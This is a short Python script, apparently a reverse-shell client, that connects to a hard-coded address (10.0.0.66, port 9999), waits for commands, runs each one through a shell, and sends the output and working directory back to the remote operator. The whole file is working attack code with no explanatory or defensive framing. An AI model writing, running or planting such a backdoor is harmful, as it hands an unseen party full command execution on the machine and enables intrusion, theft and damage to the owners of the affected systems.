import os

import socket
import subprocess

s = socket.socket()
host = '10.0.0.66'
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir((data[3:] if data[2:3].decode('utf-8') == ' ' else data[2:]).decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')
        s.send(bytes(output_str + os.getcwd() + '>', 'utf-8'))
        print(output_str)

s.close()